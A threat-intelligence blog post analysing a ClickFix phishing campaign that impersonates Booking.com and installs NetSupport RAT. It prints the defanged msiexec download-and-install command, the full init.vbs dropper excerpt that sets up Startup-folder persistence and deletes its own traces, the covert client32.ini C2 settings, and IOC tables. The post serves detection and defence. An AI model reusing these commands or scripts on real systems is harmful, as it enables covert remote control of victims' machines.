---
title: "NetSupport RAT via ClickFix"
date: 2026-05-17
draft: false
image: brand_image.jpg
tags: ["AnyRun", "ClickFix", "NetSupportRAT", "Phishing"]
series: "DFIR"
---

- Reading time : "10 min"

# ClickFix Phishing Campaign Delivering NetSupport RAT

A multi-stage attack chain leveraging fake property review portals, ClickFix social engineering, and a custom MSI dropper to establish persistent remote access via NetSupport Manager.


## Executive Summary

A threat actor is operating a sophisticated phishing campaign impersonating Booking.com, directing victims to fraudulent property review portals. A ClickFix lure tricks users into executing a malicious msiexec command that downloads and installs a custom MSI dropper from attacker-controlled IP addresses. The dropper deploys a VBScript installer that extracts password-protected archives, establishes persistence via the Windows Startup folder, and launches a silently configured NetSupport Manager client, granting the attacker full remote access to compromised machines. All staging files are deleted upon completion to impede forensic investigation. Two C2 domains masquerade as CDN infrastructure to blend into normal network traffic.


## Initial Delivery — ClickFix Phishing

#### Phishing Infrastructure

Two phishing sites are confirmed as entry points. Both impersonate the Booking.com brand and present victims with a fraudulent property review or verification flow:

![phishing Booking web site](/images/fakeBookingWebSite.png "phishing Booking web site")


| URL |	Role |
| ----|-------|
| captcha-extranet-manage.com/start/ | 	Primary lure — CAPTCHA-style ClickFix gate |
| review-your-property.com	         | Secondary lure — property review portal theme |

#### ClickFix Technique

ClickFix is a social engineering technique where a fake verification or CAPTCHA prompt instructs the victim to open the Windows Run dialog (Win+R) and paste a command that has been placed on their clipboard by the malicious page. This bypasses browser download warnings entirely — the victim believes they are completing a human verification step.

![The Clickfix CMD](/images/theClickfixCMD.png "The Clickfix CMD")

In this campaign, the ClickFix prompt delivers a msiexec command that downloads and silently installs the first-stage dropper directly from the attacker’s server. See the detonation of the full infection chain on [ANY.RUN](https://app.any.run/tasks/a2ac674c-0b4c-42c9-b669-03f4699c8b96).

```PowerShell
# Primary payload server
"C:\WINDOWS\system32\msIeXec.exe" -PᵃcKAGE hxxp://77[.]91[.]97[.]125/BookingVerifedCasBot /Q

# Secondary payload server (redundancy)
"C:\WINDOWS\system32\msIeXec.ExE" -PᵃcKᵃGE hxxp://147[.]45[.]45[.]238/genius-user /Q

```
![MSI dropper cmd ](/images/msiCMD.png "MSI dropper cmd")


#### ClickFix Backend — Dynamic Command Delivery

Static analysis of the HTTP traffic in the sandbox reveals the phishing page does not hardcode the msiexec command in the HTML. Instead, the page makes a live request to a server-side PHP endpoint to fetch the payload command at runtime:

```
GET /send_telegram.php?get_command=1
```

The server responds with a JSON object containing the full msiexec command, pre-obfuscated with Unicode superscript characters, ready to be written to the victim's clipboard:

```json
{
  "status": "success",
  "command": "msIeXec.ExE -P\u1d43cK\u1d43GE hxxp:\/\/147[.]45[.]45[.]238\/genius-user \/Q",
  "filename": "",
  "b64content": "",
  "verification_id": "vid_6a02ccdef0be59.95511780",
  "country": "Italy"
}
```

![send_telegram.php API response in ANY.RUN](/images/sendTelegramAPI.png "send_telegram.php API response captured in ANY.RUN HTTP requests")

Several aspects of this response are significant:

| Field | Value | Significance |
|-------|-------|--------------|
| `command` | msiexec with Unicode lure | Payload is served dynamically — can be swapped per victim or campaign phase |
| `verification_id` | `vid_6a02ccdef0be59.95511780` | Per-victim tracking token, likely used to mark the victim as "clicked" |
| `country` | `Italy` | Server performs geolocation — different payloads or commands may be served per region |
| `b64content` | *(empty)* | Reserved field — may carry base64-encoded alternate payloads in other campaign variants |
| endpoint name | `send_telegram.php` | Strong indicator the server also dispatches a Telegram bot notification to the operator when a victim hits the ClickFix gate |

The `send_telegram.php` endpoint name is a consistent pattern seen in ClickFix campaigns where threat actors use a Telegram bot as an out-of-band notification channel, alerting them in real time when a victim has been successfully lured into executing the command.


## MSI Dropper Analysis

The MSI file is retrieved from the attacker's distribution server and is presented to the system as a 7-Zip Archive Package installer — a common masquerading technique where a legitimate tool's installer metadata is reused to wrap malicious content.

![the dropper files ](/images/theDropperFiles.png "the dropper files")

Static analysis reveals the MSI contains five nested payload components inside ZIP containers: a shortcut payload **LnkPayload**, a PE executable **ExePayload**, a PE DLL **DllPayload**, an alternate payload **AltPayload** and a vbs file **init.vbs**. All four are delivered as the contents of the password-protected 7z archives extracted by **init.vbs**.

On another AnyRun submission we can see that the initial file lands on disk with a **.fpx** extension to prevent browser or AV classification. An embedded PowerShell step renames it to **.fpx.msi** immediately before msiexec invocation: [ANY.RUN’s](https://app.any.run/tasks/7a8e8d37-7ba1-407c-8946-a2d53f751840).



All these files were renamed while downloaded from the MSI cmd:
![The Click fix MSI FileModif](/images/theClickfixMSIFileModif.png "The Click fix MSI FileModif")

* init.vbs — Orchestration script

The conductor of the entire post-installation phase. Written by the MSI Custom Action and immediately launched by wscript.exe (SysWOW64, 32-bit) in hidden window mode. Its five responsibilities execute sequentially: extract persistence shortcut, extract RAT payload, launch RAT, wait 2 seconds, delete all evidence including itself.

Excerpt from this VBS script code:

```vbscript
Set shell = CreateObject("WScript.Shell")

localAppData   = shell.ExpandEnvironmentStrings("%LOCALAPPDATA%")
sysinfoDir     = localAppData & "\sysinfo"
startupDir     = shell.SpecialFolders("Startup")
programDataDir = shell.ExpandEnvironmentStrings("%ProgramData%") & "\sysinfo"

cmd = """" & sysinfoDir & "\7z.exe"" x " & _
      """" & sysinfoDir & "\lnk.7z"" " & _
      "-plimosik -aoa -y " & _
      "-o""" & startupDir & """"

shell.Run cmd, 0, True

cmd = """" & sysinfoDir & "\7z.exe"" x " & _
      """" & sysinfoDir & "\grace.7z"" " & _
      "-pfantombot -aoa -y " & _
      "-o""" & programDataDir & """"

shell.Run cmd, 0, True

lnkPath = startupDir & "\sysinfo.lnk"
shell.Run """" & lnkPath & """", 0, False

WScript.Sleep 2000

Dim fso
Set fso = CreateObject("Scripting.FileSystemObject")
On Error Resume Next
fso.DeleteFile sysinfoDir & "\7z.exe", True
fso.DeleteFile sysinfoDir & "\7z.dll", True
fso.DeleteFile sysinfoDir & "\grace.7z", True
fso.DeleteFile sysinfoDir & "\lnk.7z", True
fso.DeleteFile sysinfoDir & "\init.vbs", True
On Error GoTo 0
```

See all on the interactive Sandbox analysis [ANY.RUN’s](https://app.any.run/tasks/7a8e8d37-7ba1-407c-8946-a2d53f751840).


* grace.7z — Main payload archive

The largest and most significant file. A password-protected 7-Zip archive (password: **fantombot**) containing the complete NetSupport Manager client package. When extracted by init.vbs, it unpacks to C:\ProgramData\sysinfo\ and delivers the full RAT including sysinfo.exe (the renamed client32.exe), supporting DLLs, and client32.ini with hardcoded C2 configuration.


* lnk.7z — Persistence shortcut archive

A tiny 450-byte password-protected archive (password: **limosik**) containing a single Windows shortcut file: sysinfo.lnk. This is extracted directly into the Windows Startup folder, establishing persistence. On every subsequent user login, the shortcut silently launches C:\ProgramData\sysinfo\sysinfo.exe, reconnecting the NetSupport RAT to its C2 without any user interaction or visible window.

* 7z.exe — Archive extraction utility

A legitimate copy of the 7-Zip command-line executable, used purely as a tool to extract the two password-protected payload archives. Its presence is entirely instrumental — the attacker bundles it inside the MSI because the victim machine cannot be assumed to have 7-Zip installed. Using a legitimate, signed binary for this purpose is a living-off-the-land adjacent technique: the extraction itself generates no malicious process signatures since 7z.exe is a trusted tool.

* 7z.dll — 7-Zip core library

The core compression/decompression library that 7z.exe depends on at runtime. Without it, 7z.exe cannot function. The threat actor bundles both files together inside the MSI to ensure a self-contained extraction environment with no external dependencies. Like 7z.exe, this is a legitimate binary used as an operational tool rather than a malicious payload.


## C2 Infrastructure — NetSupport RAT Configuration

The final payload is a NetSupport Manager client configured to connect to two attacker-operated gateways over port 443, blending with HTTPS traffic. The configuration disables all user-facing controls, making the RAT completely invisible to the victim.


```ini

[HTTP]
GatewayAddress=img-pulse-cache.com:443 or uurdxji.com:443
SecondaryGateway=booking-static-assets.com:443 or yuaushg.com:443
Port=443
SecondaryPort=443
gsk=GN;O@MDN9E=LBFGI=C@E     ; obfuscated shared key
gskmode=0

[Client]
silent=1               ; no UI
SysTray=0             ; no system tray icon
ShowUIOnConnect=0      ; invisible when attacker connects
DisableDisconnect=1    ; victim cannot disconnect
RoomSpec=Eval          ; campaign/group identifier
Usernames=*            ; any attacker can authenticate

```

See all on the interactive Sandbox analysis file **client32.ini** [ANY.RUN’s](https://app.any.run/tasks/7a8e8d37-7ba1-407c-8946-a2d53f751840).


Attacker capabilities once connected. With NetSupport Manager installed and connecting, the threat actor has access to: full desktop view and interactive control, file system browsing and transfer, remote command execution, keylogging, screenshot capture, and session recording. The victim has no indication of access and cannot disconnect the client.

## Campaign Scope — Related Activity

TI research on ANY.RUN reveals this campaign extends well beyond the two submissions analyzed above. Multiple independent detonations share the same C2 infrastructure while rotating dropper IPs and impersonating different brands, indicating an active, maintained ClickFix-as-a-kit operation.

| Date |  Dropper IP | C2 Overlap | Report |
|------|------------|------------|--------|
| 2026-05-13 | 77.91.97.125 | 91.92.34.113 | [ANY.RUN](https://app.any.run/tasks/a2ac674c-0b4c-42c9-b669-03f4699c8b96) |
| 2026-05-12 | 147.45.45.238 | 95.85.246.53 | [ANY.RUN](https://app.any.run/tasks/6ac92cbb-88fa-4c21-b881-8614271938ec) |
| 2026-05-05 | 217.145.226.119 |  91.92.34.113 | [ANY.RUN](https://app.any.run/tasks/29cbfbc1-0701-4ee4-b015-51e7e4c1069a) |

The consistent reuse of C2 infrastructure across varying lure themes and dropper endpoints is a strong indicator of a single threat actor operating a commoditized ClickFix kit. IP rotation at the dropper layer suggests awareness of blocklist-based defenses, while C2 stability may indicate the actor prioritizes operational continuity over anonymity at the post-exploitation phase.


## Indicators of Compromise

#### Network — Phishing Domains

| Type | Indicator |
|------|-----------|
| DOMAIN | `captcha-extranet-manage[.]com` |
| DOMAIN | `review-your-property[.]com` |

#### Network — Payload Distribution

| Type | Indicator |
|------|-----------|
| IP | `77.91.97.125` |
| IP | `147.45.45.238` |
| IP | `217.145.226.119` |
| URL | `hxxp://77[.]91[.]97[.]125/BookingVerifedCasBot` |
| URL | `hxxp://147[.]45[.]45[.]238/genius-user` |
| URL PATTERN | `/send_telegram.php?get_command=1` (ClickFix dynamic command delivery endpoint) |

#### Network — C2 Infrastructure

| Type | Indicator |
|------|-----------|
| DOMAIN | `img-pulse-cache[.]com` |
| DOMAIN | `uurdxji[.]com` |
| DOMAIN | `booking-static-assets[.]com` |
| DOMAIN | `yuaushg[.]com` |
| IP | `91.92.34.113` |
| IP | `95.85.246.53` |
| PORT | `443/TCP` (NetSupport gateway protocol) |

#### File Hashes — MSI Dropper

| Type | Hash |
|------|------|
| MD5 | `9C4E14DB8CFB10AE8D9F1BB477144461` |
| SHA1 | `EA392CC47E918E28A3B4163CD7FBE474B749F740` |
| SHA256 | `9FC308606F49A3E319E881E6DD92B534881FFB37AA6939D38E1E882470CCE2AB` |

#### File Hashes — Staged Files (Dropped by msiexec)

| Type | Hash | File |
|------|------|------|
| MD5 | `c738b27e7a8b9dbfcf3fcece495ab525` | `grace.7z` (NetSupport payload archive) |
| MD5 | `95c6515d88e9ea48a9b949a81c1dac4e` | `7z.dll` |
| MD5 | `58712aacf6b0f8149c066bda3a034fc3` | `7z.exe` |
| MD5 | `64e2ca1f0d2123fdfbc6dbd04a9bfb73` | `lnk.7z` (persistence shortcut archive) |

#### Filesystem Artifacts

| Type | Path / File |
|------|-------------|
| PATH | `%LOCALAPPDATA%\sysinfo\` |
| PATH | `%LOCALAPPDATA%\sysinfo\7z.exe` |
| PATH | `%LOCALAPPDATA%\sysinfo\7z.dll` |
| PATH | `%LOCALAPPDATA%\sysinfo\init.vbs` (may be deleted by time of investigation) |
| PATH | `%ProgramData%\sysinfo\` |
| PATH | `%ProgramData%\sysinfo\sysinfo.exe` (renamed `client32.exe`) |
| PATH | `%ProgramData%\sysinfo\client32.ini` |
| PATH | `[Startup]\sysinfo.lnk` |

#### Behavioral Signatures

| Type | Value |
|------|-------|
| CMD | `msiexec -PᵃcKAGE hxxp://` (Unicode lure flag) |
| CMD | `wscript.exe %LOCALAPPDATA%\sysinfo\init.vbs` (hidden window, SysWOW64) |
| CMD | `7z.exe x *.7z -plimosik` |
| CMD | `7z.exe x grace.7z -pfantombot` |
| EXT | `.fpx` → `.fpx.msi` (rename before msiexec invocation) |
| STRING | `RoomSpec=Eval` (in client32.ini) |
| STRING | `GN;O@MDN9E=LBFGI=C@E` (NetSupport GSK value) |

#### Credentials / Campaign Config

| Type | Value | Context |
|------|-------|---------|
| PASSWORD | `fantombot` | Archive password for `grace.7z` (RAT payload) |
| PASSWORD | `limosik` | Archive password for `lnk.7z` (persistence shortcut) |
